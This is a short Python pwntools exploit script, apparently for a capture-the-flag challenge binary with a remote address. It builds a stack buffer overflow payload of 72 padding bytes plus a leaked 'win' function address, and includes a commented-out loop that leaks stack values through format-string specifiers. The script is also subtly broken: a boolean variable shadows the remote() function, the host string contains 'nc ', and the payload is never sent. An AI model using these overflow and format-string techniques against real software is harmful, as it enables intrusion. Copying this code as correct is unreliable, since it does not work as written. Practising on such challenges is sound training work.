from pwn import *

remote = False
if remote:
    host, port = "nc 34.101.89.183", 8006
    p = remote(host, port)
else:
    p = process("./chall")


win_addr = p.recvline().decode().strip().split()[-1]
payload = b"A" * 72 + p64(int(win_addr, 16))
print(payload)
p.recvuntil(b"input: ")


# i = 0
# for i in range(100):
#     p = process("./chall")

#     win_addr = p.recvline().decode().strip().split()[-1]

#     p.recvuntil(b"input: ")
#     payload = f"%{i:02d}$p"
#     p.sendline(payload.encode())
#     p.recvline()
#     p.recvline()
#     p.recvline()
#     addr = p.recvline().decode().strip()
#     # if win_addr == addr:
#     #     print(f"win_addr: {win_addr}")
#     #     print(f"addr: {addr}")
#     #     print(f"payload: {payload}")
#     #     break
#     if addr.endswith("00"):
#         print(f"win_addr: {win_addr}")
#         print(f"addr: {addr}")
#         print(f"payload: {payload}")
#         break
#     p.close()

# p.interactive()
